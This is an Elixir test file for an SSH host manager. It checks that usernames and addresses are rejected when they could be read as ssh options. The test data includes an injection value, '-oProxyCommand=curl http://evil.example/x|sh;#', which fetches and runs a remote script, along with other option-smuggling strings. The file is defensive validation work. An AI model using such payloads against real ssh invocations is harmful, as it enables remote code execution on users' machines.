defmodule Ssm.Hosts.SshFieldsTest do
  @moduledoc """
  Host username/address become arguments of the local `ssh` forwarder
  process. Anything that could be read as an ssh option (or a second
  `user@host`) must be refused at input and again before any SSH.
  """
  use Ssm.DataCase, async: false

  import Ssm.Fixtures

  alias Ssm.Hosts
  alias Ssm.Hosts.SshFields

  @proxy_command "-oProxyCommand=curl http://evil.example/x|sh;#"

  describe "valid_username?/1" do
    test "accepts ordinary unix login names" do
      for name <- ~w(root deploy svc_backup a.b-c _admin user01) do
        assert SshFields.valid_username?(name), name
      end
    end

    test "refuses option-like, whitespace, @, too long" do
      for name <- [
            @proxy_command,
            "-l",
            "root@evil",
            "a b",
            "a,b",
            "",
            "x\n",
            String.duplicate("a", 33),
            nil
          ] do
        refute SshFields.valid_username?(name), inspect(name)
      end
    end
  end

  describe "valid_address?/1" do
    test "accepts hostnames and IP literals" do
      for a <- ~w(10.0.0.1 web01 web01.example.com host_name.lan 2001:db8::1 ::1 fe80::1 a.b.c.) do
        assert SshFields.valid_address?(a), a
      end
    end

    test "refuses leading dash, whitespace, separators, zones, junk" do
      for a <- [
            "-oProxyCommand=x",
            "-x.example",
            "web-.example",
            "a b",
            "a,b",
            "user@host",
            "fe80::1%eth0",
            "[::1]",
            "host:22",
            "",
            "a..b",
            "x\n",
            String.duplicate("a", 64) <> ".example",
            nil
          ] do
        refute SshFields.valid_address?(a), inspect(a)
      end
    end
  end

  describe "Host changeset" do
    test "refuses the ProxyCommand username and a dash-leading address" do
      assert {:error, cs} =
               Hosts.create_host(%{
                 name: "x",
                 username: @proxy_command,
                 address: "10.0.0.1",
                 port: 22
               })

      assert %{username: [_]} = errors_on(cs)

      assert {:error, cs} =
               Hosts.create_host(%{
                 name: "y",
                 username: "root",
                 address: "-oProxyCommand=x",
                 port: 22
               })

      assert %{address: [_]} = errors_on(cs)
    end

    test "legacy rows with bad values still load and can be edited in other fields" do
      host = host_fixture()

      Repo.query!("UPDATE host SET username = ?, address = ? WHERE id = ?", [
        @proxy_command,
        "-evil",
        host.id
      ])

      legacy = Hosts.get_host(host.id)
      assert legacy.username == @proxy_command
      assert {:ok, toggled} = Hosts.update_host(legacy, %{disabled: true})
      assert toggled.disabled

      assert [{%{id: id}, problems}] = Hosts.list_hosts_unsafe_for_ssh()
      assert id == host.id
      assert Enum.sort(problems) == [:address, :username]
    end
  end

  test "an unsafe jump hop makes the whole chain unsafe" do
    bastion = host_fixture(%{name: "bastion"})
    leaf = host_fixture(%{name: "leaf", jump_via: bastion.id})
    Repo.query!("UPDATE host SET username = ? WHERE id = ?", [@proxy_command, bastion.id])

    assert {:error, {:ssh_connect_failed, message}} =
             leaf |> Hosts.target_for() |> SshFields.check_target()

    assert message =~ "bastion"
    assert message =~ "username"
    refute message =~ "curl"
  end
end
